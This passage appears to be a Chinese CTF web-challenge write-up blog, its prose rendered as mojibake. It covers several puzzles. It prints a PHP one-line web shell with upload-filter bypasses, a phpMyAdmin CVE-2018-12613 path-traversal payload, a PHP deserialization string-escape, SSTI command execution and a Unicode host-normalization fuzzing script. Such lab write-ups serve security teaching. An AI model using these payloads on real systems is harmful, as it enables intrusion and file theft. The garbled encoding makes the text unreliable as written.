alt=""></p><p>ä½¿ç”¨dirsearchæ‰«å‡º/.gitç›®å½•ï¼Œæ‰€ä»¥ä½¿ç”¨GitHackè·å¾—æœ¬é¢˜gitæ³„éœ²çš„æºç ã€‚</p><pre><code>&lt;?php$flag = file_get_contents(&apos;/flag&apos;);</code></pre><p>flag.phpçš„ä»£ç ã€‚</p><pre><code>&lt;?phpinclude &apos;flag.php&apos;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &apos;yds&apos;;foreach($_POST as $x =&gt; $y){$$x = $y;}foreach($_GET as $x =&gt; $y){$$x = $$y;}foreach($_GET as $x =&gt; $y){if($_GET[&apos;flag&apos;] === $x &amp;&amp; $x !== &apos;flag&apos;){exit($handsome);}}if(!isset($_GET[&apos;flag&apos;]) &amp;&amp; !isset($_POST[&apos;flag&apos;])){exit($yds);}if($_POST[&apos;flag&apos;] === &apos;flag&apos;  || $_GET[&apos;flag&apos;] === &apos;flag&apos;){exit($is);}echo &quot;the flag is: &quot;.$flag;</code></pre><p>index.phpæ–‡ä»¶ä¸­çš„ä»£ç ã€‚<br>å®¡è®¡ä»£ç å¯çŸ¥ï¼Œæˆ‘ä»¬æœ€ç»ˆåº”è¯¥è¦è®©è¿è¡Œexit($flag)ä»è€Œè·å¾—flagã€‚<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨$ydsï¼Œé€šè¿‡æ„é€ ä»è€Œè·å¾—flagã€‚</p><p>å¯ä»¥ç›´æ¥getä¼ å‚?yds=flag</p><pre><code>foreach($_GET as $x =&gt; $y){$$x = $$y;}</code></pre><p>å˜æˆäº†$yds=$flag</p><pre><code>if(!isset($_GET[&apos;flag&apos;]) &amp;&amp; !isset($_POST[&apos;flag&apos;])){exit($yds);}</code></pre><p>getçš„æ˜¯ydsæ‰€ä»¥å¯ä»¥ç»•è¿‡æ‰§è¡Œexit($flag)ã€‚</p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1givy1v2zepj30fr02z3yf.jpg" alt=""><br>å°è¯•ä¸Šä¼ å¸¦æœ‰ä¸€å¥è¯æœ¨é©¬çš„jpgæ–‡ä»¶ï¼Œè¢«æ£€æµ‹åˆ°äº†ï¼Œä¼°è®¡æ˜¯è¿‡æ»¤äº†&lt;?phpï¼Œæ‰€ä»¥æƒ³åˆ°ä½¿ç”¨scriptä»£æ›¿ã€‚</p><pre><code>&lt;script language=&quot;php&quot;&gt; eval($_POST[&apos;hack&apos;]) &lt;/script&gt;</code></pre><p>æŠ“åŒ…ä¿®æ”¹åç¼€ä¸ºphpï¼Œè¢«æ£€æµ‹åˆ°æ˜¾ç¤ºåç¼€ä¸èƒ½æœ‰phï¼Œæ‰€ä»¥ä½¿ç”¨php3ç­‰è¿™æ ·çš„ç»•è¿‡éƒ½ä¸è¡Œäº†ï¼Œäºæ˜¯æƒ³åˆ°ä¸Šä¼ .htaccessã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givy6uwruaj30cb037mx1.jpg" alt=""><br>ç›´æ¥ä¸Šä¼ ä¸èƒ½ä¸Šä¼ ï¼Œæ‰€ä»¥æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸ºimage/jpegä¸Šä¼ æˆåŠŸï¼Œç„¶åä¸Šä¼ å¸¦æœ¨é©¬çš„jpgæ–‡ä»¶ï¼Œç”¨èšå‰‘è¿æ¥ã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givy95zcsfj30r40att9l.jpg" alt=""><br>æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagã€‚</p><h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1givyud6ezaj30c60a8jrv.jpg" alt=""></p><p>é€šè¿‡dirsearchå‘ç°å­˜åœ¨robots.txtæ–‡ä»¶å’Œphpinfo.phpï¼Œè€Œä¸”è¿˜æœ‰phpmyadminã€‚æ‰“å¼€robots.txtå°±æ˜¯æç¤ºæœ‰phpinfo.phpã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1givyxt3wlaj31f40jk428.jpg" alt=""><br>æ‰“å¼€phpmyadminç•Œé¢ï¼Œç›´æ¥å°±è¿›å»äº†ã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1givz2nxhlvj30ao03pmx4.jpg" alt=""></p><p>çœ‹åˆ°ä¸ªphpMyAdminçš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥ç™¾åº¦ä¸€ä¸‹è¿™ä¸ªç‰ˆæœ¬çš„æ¼æ´ã€‚<br>å‚è€ƒï¼š<br><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd" target="_blank" rel="noopener" title="phpmyadmin4.8.1åå°getshell ">https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd</a><br><a href="https://www.jianshu.com/p/fb9c2ae16d09" target="_blank" rel="noopener" title="cve-2018-12613-PhpMyadminåå°æ–‡ä»¶åŒ…å«">https://www.jianshu.com/p/fb9c2ae16d09</a></p><p>æ„é€ payload:</p><pre><code>index.php?target=db_datadict.php%253f/../../../../../../../../flag</code></pre><p>å³å¯è·å¾—flagã€‚</p><h2 id="BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#BJDCTF-2nd-å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>[BJDCTF 2nd]å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h2><p>è¿›å»å‘ç°æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä½¿ç”¨adminç™»å½•ä¼šæç¤ºä¸æ˜¯adminï¼Œé™¤äº†adminä»¥å¤–çš„è´¦å·éƒ½èƒ½ç™»å½•ï¼Œç™»å½•è¿›å»ä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆï¼Œäºæ˜¯åœ¨ç™»å½•æ—¶æŠ“åŒ…åˆ†æã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1givzw7kh2ij30eg05k0sr.jpg" alt=""></p><p>å‘ç°é¢˜ç›®çš„æç¤ºã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1givzz6wfooj31ar0e60ti.jpg" alt=""><br>è¿›å»åˆ·æ–°ä¸€ä¸‹é¡µé¢å°±å˜æˆè¿™æ ·äº†ï¼Œäºæ˜¯æŠ“åŒ…åˆ†æã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw00ja2x4j30vw0eata4.jpg" alt=""><br>çœ‹åˆ°æœ‰æ—¶é—´ï¼Œä¿®æ”¹æ—¶é—´ä¸ºå¾ˆå¤§çš„å€¼ï¼Œæ˜¾ç¤ºè¦æ¥è‡ªlocalhostæ‰è¡Œã€‚<br><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giw03mnmyuj30yb0c7jsh.jpg" alt=""><br>å‘ç°X-Forwarded-Forè¢«æ£€æµ‹åˆ°äº†ï¼Œç™¾åº¦ä¸€ä¸‹çŸ¥é“äº†å¦ä¸€ä¸ªæ–¹æ³•ã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw05ieajnj30xh0czmya.jpg" alt=""><br>ä½¿ç”¨Client-ipã€‚æç¤ºè¦æ¥è‡ªgem-love.comã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw08ltjaaj30x90bzjsg.jpg" alt=""><br>ç”¨Refererç»•è¿‡ã€‚æ¥ç€æç¤ºéœ€è¦Commodo 64æµè§ˆå™¨ã€‚ä½†æ˜¯ç›´æ¥ä¿®æ”¹User-Agentä¸ºCommodo 64ã€‚ç°åœ¨ä¸å¯¹ï¼ŒæŸ¥äº†ä¸€ä¸‹å…¨ç§°æ˜¯Commodore 64ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw0d90k2ij30x80e43zz.jpg" alt=""><br>éœ€è¦æˆ‘ä»¬çš„é‚®ç®±æ˜¯ï¼š<a href="mailto:root@gem-love.com">root@gem-love.com</a>ã€‚<br><img src="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw0ehexn7j30y80bz0ty.jpg" alt=""><br>ä½¿ç”¨Fromã€‚å‘ç°åˆéœ€è¦ä»£ç†æœåŠ¡åœ°å€æ˜¯y1ng.vipã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw0gqcbmhj30xy0cadh5.jpg" alt=""><br>ä½¿ç”¨viaã€‚ä»è€Œè·å¾—flagã€‚</p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>å°è¯•æ³¨å…¥ï¼Œå‘ç°å¹¶ä¸è¡Œï¼Œæ‰€ä»¥è§‰å¾—åº”è¯¥ä¸æ˜¯SQLæ³¨å…¥ï¼Œåˆ©ç”¨dirsearchæ‰«æã€‚<br><img src="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw19f319qj30ai04kt8r.jpg" alt=""><br>å‘ç°é¡µé¢å¤‡ä»½æ–‡ä»¶<a href="http://www.zipã€‚" target="_blank" rel="noopener">www.zipã€‚</a><br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giw1ma6qwaj30lx09ejrz.jpg" alt=""><br>ä¸‹è½½åå³å¯çœ‹åˆ°é¢˜ç›®çš„æºç ã€‚</p><p>update.php</p><pre><code>&lt;?php    require_once(&apos;class.php&apos;);    if($_SESSION[&apos;username&apos;] == null) {        die(&apos;Login First&apos;);        }    if($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) {        $username = $_SESSION[&apos;username&apos;];        if(!preg_match(&apos;/^\d{11}$/&apos;, $_POST[&apos;phone&apos;]))            die(&apos;Invalid phone&apos;);        if(!preg_match(&apos;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/&apos;, $_POST[&apos;email&apos;]))            die(&apos;Invalid email&apos;);        if(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)            die(&apos;Invalid nickname&apos;);        $file = $_FILES[&apos;photo&apos;];        if($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)            die(&apos;Photo size error&apos;);        move_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));        $profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];        $profile[&apos;email&apos;] = $_POST[&apos;email&apos;];        $profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];        $profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);        $user-&gt;update_profile($username, serialize($profile));        echo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;    }    else {?&gt;</code></pre><p>é€šè¿‡æ­£åˆ™åŒ¹é…æ¥è¿‡æ»¤æˆ‘ä»¬æäº¤çš„æ•°æ®ï¼Œåˆ¤æ–­nicknameè¿™é‡Œåˆ¤æ–­äº†nicknameæ˜¯å¦ä¸ºå­—ç¬¦ä»¥åŠé•¿åº¦æ˜¯å¦è¶…è¿‡10ï¼Œè¿™é‡Œå¦‚æœä¼ å…¥çš„nicknameæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œåˆ™å¯ä»¥ç»•è¿‡é•¿åº¦çš„é™åˆ¶ã€‚ä»£ç æœ€åè°ƒç”¨äº†update_profileå‡½æ•°ï¼Œåº”è¯¥æ˜¯æŠŠ$useræ”¾è¿›æ•°æ®åº“é‡Œé¢ã€‚</p><p>class.php</p><pre><code>&lt;?phprequire(&apos;config.php&apos;);class user extends mysql{    private $table = &apos;users&apos;;    public function is_exists($username) {        $username = parent::filter($username);        $where = &quot;username = &apos;$username&apos;&quot;;        return parent::select($this-&gt;table, $where);    }    public function register($username, $password) {        $username = parent::filter($username);        $password = parent::filter($password);        $key_list = Array(&apos;username&apos;, &apos;password&apos;);        $value_list = Array($username, md5($password));        return parent::insert($this-&gt;table, $key_list, $value_list);    }    public function login($username, $password) {        $username = parent::filter($username);        $password = parent::filter($password);        $where = &quot;username = &apos;$username&apos;&quot;;        $object = parent::select($this-&gt;table, $where);        if ($object &amp;&amp; $object-&gt;password === md5($password)) {            return true;        } else {            return false;        }    }    public function show_profile($username) {        $username = parent::filter($username);        $where = &quot;username = &apos;$username&apos;&quot;;        $object = parent::select($this-&gt;table, $where);        return $object-&gt;profile;    }    public function update_profile($username, $new_profile) {        $username = parent::filter($username);        $new_profile = parent::filter($new_profile);        $where = &quot;username = &apos;$username&apos;&quot;;        return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);    }    public function __tostring() {        return __class__;    }}class mysql {    private $link = null;    public function connect($config) {        $this-&gt;link = mysql_connect(            $config[&apos;hostname&apos;],            $config[&apos;username&apos;],             $config[&apos;password&apos;]        );        mysql_select_db($config[&apos;database&apos;]);        mysql_query(&quot;SET sql_mode=&apos;strict_all_tables&apos;&quot;);        return $this-&gt;link;    }    public function select($table, $where, $ret = &apos;*&apos;) {        $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;        $result = mysql_query($sql, $this-&gt;link);        return mysql_fetch_object($result);    }    public function insert($table, $key_list, $value_list) {        $key = implode(&apos;,&apos;, $key_list);        $value = &apos;\&apos;&apos; . implode(&apos;\&apos;,\&apos;&apos;, $value_list) . &apos;\&apos;&apos;;         $sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;;        return mysql_query($sql);    }    public function update($table, $key, $value, $where) {        $sql = &quot;UPDATE $table SET $key = &apos;$value&apos; WHERE $where&quot;;        return mysql_query($sql);    }    public function filter($string) {        $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);        $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;        $string = preg_replace($escape, &apos;_&apos;, $string);        $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);        $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;        return preg_replace($safe, &apos;hacker&apos;, $string);    }    public function __tostring() {        return __class__;    }}session_start();$user = new user();$user-&gt;connect($config);</code></pre><p>åœ¨class.phpä¸­å¯ä»¥çœ‹åˆ°update_profile()çš„æ–¹æ³•ã€‚</p><pre><code>public function update_profile($username, $new_profile) {        $username = parent::filter($username);        $new_profile = parent::filter($new_profile);        $where = &quot;username = &apos;$username&apos;&quot;;        return parent::update($this-&gt;table, &apos;profile&apos;, $new_profile, $where);    }</code></pre><p>update_profile()ä¸­ä½¿ç”¨äº†mysqlç±»ä¸­çš„filter()å‡½æ•°å’Œupdate()å‡½æ•°ã€‚</p><p>filter()</p><pre><code>public function filter($string) {        $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);        $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;        $string = preg_replace($escape, &apos;_&apos;, $string);        $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);        $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;        return preg_replace($safe, &apos;hacker&apos;, $string);    }</code></pre><p>update()</p><pre><code>public function update($table, $key, $value, $where) {        $sql = &quot;UPDATE $table SET $key = &apos;$value&apos; WHERE $where&quot;;        return mysql_query($sql);    }</code></pre><p><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giw4n6ec6nj30l70ctjrw.jpg" alt=""><br>æ‰€ä»¥update.phpå°±æ˜¯å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œç„¶ååºåˆ—åŒ–ï¼Œå°†åºåˆ—åŒ–çš„å­—ç¬¦ä¸­çš„â€™å’Œ\æ›¿æ¢ä¸º_ï¼Œå°†selectï¼Œinsertï¼Œupdateï¼Œdeleteå’Œwhereæ›¿æ¢ä¸ºhackerã€‚</p><p>profile.php</p><pre><code>&lt;?php    require_once(&apos;class.php&apos;);    if($_SESSION[&apos;username&apos;] == null) {        die(&apos;Login First&apos;);        }    $username = $_SESSION[&apos;username&apos;];    $profile=$user-&gt;show_profile($username);    if($profile  == null) {        header(&apos;Location: update.php&apos;);    }    else {        $profile = unserialize($profile);        $phone = $profile[&apos;phone&apos;];        $email = $profile[&apos;email&apos;];        $nickname = $profile[&apos;nickname&apos;];        $photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));?&gt;</code></pre><p>è¿™é‡Œå°†ä¿¡æ¯ååºåˆ—åŒ–ï¼Œè¿˜ä¼šè¯»å–ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p><p>config.php</p><pre><code>&lt;?php    $config[&apos;hostname&apos;] = &apos;127.0.0.1&apos;;    $config[&apos;username&apos;] = &apos;root&apos;;    $config[&apos;password&apos;] = &apos;&apos;;    $config[&apos;database&apos;] = &apos;&apos;;    $flag = &apos;&apos;;?&gt;</code></pre><p>å¾ˆæ˜æ˜¾ã€‚flagæ˜¯åœ¨config.phpä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ„é€ åŒ…å«config.phpçš„æ•°æ®ï¼Œåˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸ã€‚</p><p>ååºåŒ–æ˜¯ä»¥â€;}ç»“æŸçš„ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠâ€;}åŠ åˆ°éœ€è¦ååºåŒ–çš„å­—ç¬¦ä¸­ï¼Œå°±å¯ä»¥æå‰ç»“æŸ;}ä¹‹åçš„å†…å®¹ã€‚è€Œupdate.phpå°†å‚æ•°åºåˆ—åŒ–ï¼Œåºåˆ—åŒ–çš„å­—ç¬¦å’Œé•¿åº¦ä¸å¯æ§ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨class.phpä¸­çš„filter()å‡½æ•°ã€‚</p><pre><code>public function filter($string) {        $escape = array(&apos;\&apos;&apos;, &apos;\\\\&apos;);        $escape = &apos;/&apos; . implode(&apos;|&apos;, $escape) . &apos;/&apos;;        $string = preg_replace($escape, &apos;_&apos;, $string);        $safe = array(&apos;select&apos;, &apos;insert&apos;, &apos;update&apos;, &apos;delete&apos;, &apos;where&apos;);        $safe = &apos;/&apos; . implode(&apos;|&apos;, $safe) . &apos;/i&apos;;        return preg_replace($safe, &apos;hacker&apos;, $string);    }</code></pre><p>è¿™é‡Œæ˜¯å°†â€™selectâ€™, â€˜insertâ€™, â€˜updateâ€™, â€˜deleteâ€™, â€˜whereâ€™æ›¿æ¢æˆâ€™hackerâ€™ï¼Œæˆ‘ä»¬å†™å…¥whereæ›¿æ¢æˆhackerä¹‹åå­—ç¬¦ä¸²å®é™…çš„é•¿åº¦å°±+1ï¼Œ<br>å› ä¸ºwhereæ˜¯5ä¸ªå­—ç¬¦ï¼Œè€Œhackeræ˜¯6ä¸ªå­—ç¬¦ã€‚å› æ­¤å®é™…çš„é•¿åº¦å¤§äºåºåˆ—åŒ–å›ºå®šçš„é•¿åº¦ï¼ˆå˜é‡å‰é¢â€˜sâ€™é‡Œçš„å€¼ï¼‰ã€‚åˆ©ç”¨ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œååºåˆ—åŒ–æ—¶åªèƒ½å°†å­—ç¬¦ä¸²ä¸­nicknameå‰é¢çš„såé¢é•¿åº¦çš„å­—ç¬¦ä¸²ååºåˆ—åŒ–æˆåŠŸï¼Œè¿™ä¸ªæ˜¯ä¼ å‚çš„æ—¶å€™å°±å›ºå®šå¥½äº†ã€‚</p><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯å°†â€;}s:5:â€photoâ€;s:10:â€config.phpâ€;}æ’å…¥åºåˆ—åŒ–çš„å­—ç¬¦ä¸²é‡Œé¢å»ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯34ä½ï¼Œæ‰€ä»¥éœ€è¦æ„é€ 34ä¸ªwhereï¼Œå½“æ›¿æ¢æˆhackeræ—¶å°±ä¼šå¤šå‡º34ä½å°†æ’å…¥çš„å­—ç¬¦æŒ¤å‡ºå»ï¼Œè¿™æ ·æ’å…¥çš„å­—ç¬¦å°±ä¸æ˜¯nicknameçš„å€¼ï¼Œä»è€Œå°†photoçš„å€¼ä¿®æ”¹ä¸ºconfig.phpï¼Œæœ€åå°±ä¼šæ‰§è¡Œfile_get_content(config.php)å‘½ä»¤ä»è€Œè·å¾—flagã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giw64s1xwsj30yq0i0go2.jpg" alt=""><br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giw651g7b6j30yn0getbo.jpg" alt=""><br>æœ€ååœ¨profile.phpè·å¾—flagã€‚<br>å‚è€ƒ:<a href="https://www.cnblogs.com/g0udan/p/12216207.html" target="_blank" rel="noopener">https://www.cnblogs.com/g0udan/p/12216207.html</a></p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>é¢˜ç›®æç¤ºipï¼Œæ‰€ä»¥æƒ³åˆ°X-Forwarded-Forã€‚<br><img src="https://tva3.sinaimg.cn/large/007u7C9Rgy1giw9diu7wsj310s0cxt9s.jpg" alt=""><br>ä¿®æ”¹X-Forwarded-Forå‘ç°é¢˜ç›®æ˜¾ç¤ºçš„ipå€¼ä¹Ÿæ”¹å˜äº†ï¼Œè¯´æ˜æ˜¯å¯æ§çš„ã€‚<br><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giw9g518nij30wl0cvdgv.jpg" alt=""><br>ç»æµ‹è¯•å‘ç°å­˜åœ¨sstiæ³¨å…¥æ¼æ´ã€‚<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giw9hc2xetj30t50c0aam.jpg" alt=""><br>æ‰§è¡Œå‘½ä»¤ï¼Œåœ¨æ ¹ç›®å½•ä¸‹å‘ç°flagã€‚<br><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giw9i7crb0j310409kjs5.jpg" alt=""><br>ä½¿ç”¨cat /flagè·å¾—flagã€‚</p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giwacezpdej315f0mlqdq.jpg" alt=""><br>å‡ºè‡ª2019blackhatçš„è®®é¢˜</p><p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p><pre><code>@app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])def getUrl():    url = request.args.get(&quot;url&quot;)    host = parse.urlparse(url).hostname    if host == &apos;suctf.cc&apos;:        return &quot;æˆ‘æ‰Œ your problem? 111&quot;    parts = list(urlsplit(url))    host = parts[1]    if host == &apos;suctf.cc&apos;:           return &quot;æˆ‘æ‰Œ your problem? 222 &quot; + host    newhost = []    for h in host.split(&apos;.&apos;):           newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))    parts[1] = &apos;.&apos;.join(newhost)    #å»æ‰ url ä¸­çš„ç©ºæ ¼    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]    host = parse.urlparse(finalUrl).hostname    if host == &apos;suctf.cc&apos;:        return urllib.request.urlopen(finalUrl).read()    else:        return &quot;æˆ‘æ‰Œ your problem? 333&quot;</code></pre><p>é¢˜ç›®æºç ï¼Œå…¶ä¸­ä¸‰ä¸ªifåˆ¤æ–­è¯­å¥æ¡ä»¶éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æ¯ä¸€ä¸ªhostçš„æ„é€ éƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚</p><p>å½“URL ä¸­å‡ºç°ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„æ—¶å€™ï¼Œè¾“å‡ºçš„ç»“æœå¯èƒ½ä¸åœ¨é¢„æœŸ</p><p>æ‰€ä»¥gæŒ‰ç…§etUrlå‡½æ•°å†™å‡ºçˆ†ç ´è„šæœ¬å³å¯å¾—åˆ°æˆ‘ä»¬èƒ½å¤Ÿé€ƒé€¸çš„æ„é€ è¯­å¥</p><pre><code>from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode():for x in range(65536):uni=chr(x)url=&quot;http://suctf.c{}&quot;.format(uni)try:if getUrl(url):print(&quot;str: &quot;+uni+&apos; unicode: \\u&apos;+str(hex(x))[2:])except:passdef getUrl(url):url=urlhost=parse.urlparse(url).hostnameif host == &apos;suctf.cc&apos;:return Falseparts=list(urlsplit(url))host=parts[1]if host == &apos;suctf.cc&apos;:return Falsenewhost=[]for h in host.split(&apos;.&apos;):newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))parts[1]=&apos;.&apos;.join(newhost)finalUrl=urlunsplit(parts).split(&apos; &apos;)[0]host=parse.urlparse(finalUrl).hostnameif host == &apos;suctf.cc&apos;:return Trueelse:return Falseif __name__==&apos;__main__&apos;:get_unicode()</code></pre><p>è„šæœ¬æ˜¯å‚è€ƒä¸‹æ–¹åšå®¢çš„ã€‚</p><p><img src="https://tva4.sinaimg.cn/large/007u7C9Rgy1giwb2h6cqpj30f907q3yr.jpg" alt=""></p><p>åªéœ€è¦å…¶ä¸­ä»»æ„ä¸€ä¸ªå°±èƒ½è¯»å–æ–‡ä»¶äº†ã€‚<br><img src="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giwb87ii64j31f50jsabj.jpg" alt=""><br>é¢˜ç›®æç¤ºæˆ‘ä»¬æ˜¯nginxï¼Œæ‰€ä»¥æˆ‘ä»¬å»è¯»å–nginxçš„é…ç½®æ–‡ä»¶ï¼Œé¢˜ç›®å°±æç¤ºäº†flagçš„ä½ç½®ã€‚<br>æ„é€ payload:getUrl?url=file://suctf.câ„‚/../../../../..//usr/fffffflagå³å¯è·å¾—flagã€‚</p><p>éƒ¨åˆ†nginxçš„é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®</p><pre><code>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginxä¸»é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.confç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.serviceæ¨¡å—ï¼š/usr/lisb64/nginx/modulesåº”ç”¨ç¨‹åºï¼š/usr/sbin/nginxç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/htmlæ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx</code></pre><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/Cl0ud/p/12187204.html" target="_blank" rel="noopener">https://www.cnblogs.com/Cl0ud/p/12187204.html</a></p><h2 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h2><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giwbxsv144j30l90c4mxy.jpg" alt=""><br>é˜…è¯»ä»£ç å‘ç°å’Œä¹‹å‰åšè¿‡çš„[ZJCTF 2019]NiZhuanSiWeiç±»ä¼¼ï¼Œç›´æ¥æ„é€ 